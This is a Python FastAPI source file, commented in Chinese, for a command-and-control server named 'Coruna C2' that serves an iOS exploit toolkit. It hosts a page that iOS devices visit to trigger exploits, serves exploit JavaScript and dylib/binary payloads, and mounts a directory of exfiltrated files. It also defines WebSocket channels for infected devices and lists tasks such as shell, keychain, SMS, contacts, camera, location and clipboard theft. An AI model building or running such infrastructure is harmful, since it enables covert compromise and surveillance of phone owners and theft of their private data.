"""FastAPI 主应用"""

from fastapi import FastAPI, Request, Depends, WebSocket
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import os
from pathlib import Path

from database import engine, Base
from config import get_config
from api import devices, tasks, upload, postexploit, admin, websocket, payloads

config = get_config()


@asynccontextmanager
async def lifespan(app: FastAPI):
    """应用生命周期管理"""
    # 启动时创建数据库表
    Base.metadata.create_all(bind=engine)
    
    # 创建必要的目录
    config.EXFIL_DIR.mkdir(parents=True, exist_ok=True)
    config.LOG_DIR.mkdir(parents=True, exist_ok=True)
    config.PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)
    
    print("[OK] Database initialized")
    print("[OK] Directories created")
    print(f"[OK] Server running on: http://{config.HOST}:{config.PORT}")
    
    yield
    
    # 关闭时清理
    print("Shutting down...")


# 创建 FastAPI 应用
app = FastAPI(
    title="Coruna C2 Server",
    description="Command and Control server for iOS exploit toolkit",
    version="1.0.0",
    lifespan=lifespan
)

# CORS 中间件
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # 生产环境应该限制
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ==================== 路由注册 ====================

# API 路由
app.include_router(devices.router)
app.include_router(tasks.router)
app.include_router(upload.router)
app.include_router(postexploit.router)
app.include_router(admin.router)
app.include_router(payloads.router)

# WebSocket 路由
@app.websocket("/ws/device/{device_uuid}")
async def websocket_device_endpoint(websocket: WebSocket, device_uuid: str):
    """设备 WebSocket 连接端点"""
    from api.websocket import websocket_endpoint
    await websocket_endpoint(websocket, device_uuid=device_uuid, admin=False)


@app.websocket("/ws/admin")
async def websocket_admin_endpoint(websocket: WebSocket):
    """管理员 WebSocket 连接端点"""
    from api.websocket import websocket_endpoint
    await websocket_endpoint(websocket, admin=True)


# ==================== 静态文件服务 ====================

# 获取项目根目录
project_root = Path(__file__).parent.parent

# 挂载静态文件目录（用于提供管理面板资源）
static_dir = project_root / "frontend" / "static"
if static_dir.exists():
    app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")

# 挂载外泄文件目录
if config.EXFIL_DIR.exists():
    app.mount("/exfil", StaticFiles(directory=str(config.EXFIL_DIR)), name="exfil")

# 挂载 downloaded 目录（用于提供 .min.js 漏洞利用文件）
downloaded_dir = project_root / "downloaded"
if downloaded_dir.exists():
    app.mount("/downloaded", StaticFiles(directory=str(downloaded_dir)), name="downloaded")

# 挂载 payloads 目录（用于提供 dylib/bin 文件）
payloads_dir = project_root / "payloads"
if payloads_dir.exists():
    app.mount("/payloads", StaticFiles(directory=str(payloads_dir)), name="payloads")


# ==================== 根路径和健康检查 ====================

@app.get("/", response_class=HTMLResponse)
async def root():
    """根路径 - 返回管理面板"""
    admin_html = project_root / "frontend" / "admin.html"
    if admin_html.exists():
        with open(admin_html, "r", encoding="utf-8") as f:
            return f.read()
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Coruna C2 Server</title>
        <meta charset="utf-8">
    </head>
    <body>
        <h1>Coruna C2 Server</h1>
        <p>Server is running. API documentation available at <a href="/docs">/docs</a></p>
        <p>WebSocket endpoints:</p>
        <ul>
            <li>Device: ws://host:port/ws/device/{device_uuid}</li>
            <li>Admin: ws://host:port/ws/admin</li>
        </ul>
    </body>
    </html>
    """


@app.get("/group.html", response_class=HTMLResponse)
async def group_page():
    """漏洞利用页面 - iOS设备访问此页面触发漏洞"""
    group_html = project_root / "group.html"
    if group_html.exists():
        with open(group_html, "r", encoding="utf-8") as f:
            return f.read()
    return HTMLResponse(content="<h1>group.html not found</h1>", status_code=404)


@app.get("/platform_module.js")
async def platform_module_js():
    """平台模块 JS"""
    module_file = project_root / "platform_module.js"
    if module_file.exists():
        with open(module_file, "r", encoding="utf-8") as f:
            content = f.read()
        from fastapi.responses import Response
        return Response(content=content, media_type="application/javascript")
    return Response(content="// Not found", status_code=404)


@app.get("/utility_module.js")
async def utility_module_js():
    """工具模块 JS"""
    module_file = project_root / "utility_module.js"
    if module_file.exists():
        with open(module_file, "r", encoding="utf-8") as f:
            content = f.read()
        from fastapi.responses import Response
        return Response(content=content, media_type="application/javascript")
    return Response(content="// Not found", status_code=404)


@app.get("/health")
async def health_check():
    """健康检查端点"""
    return {
        "status": "healthy",
        "server": "Coruna C2",
        "version": "1.0.0"
    }


@app.get("/api/info")
async def server_info():
    """服务器信息"""
    return {
        "server": "Coruna C2 Server",
        "version": "1.0.0",
        "supported_ios_versions": config.SUPPORTED_IOS_VERSIONS,
        "exploit_stages": config.EXPLOIT_STAGES,
        "task_types": [
            "shell", "upload", "download", "screenshot", 
            "keychain", "contact", "sms", "camera", "location",
            "app_list", "process_list", "wifi_scan", "clipboard"
        ]
    }


# ==================== 错误处理 ====================

from fastapi import HTTPException
from fastapi.responses import JSONResponse


@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """HTTP 异常处理"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "error": True,
            "message": exc.detail,
            "status_code": exc.status_code
        }
    )


@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """通用异常处理"""
    import traceback
    print(f"Unhandled exception: {exc}")
    print(traceback.format_exc())
    
    return JSONResponse(
        status_code=500,
        content={
            "error": True,
            "message": "Internal server error",
            "detail": str(exc)
        }
    )


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "backend.main:app",
        host=config.HOST,
        port=config.PORT,
        reload=True,
        log_level="info"
    )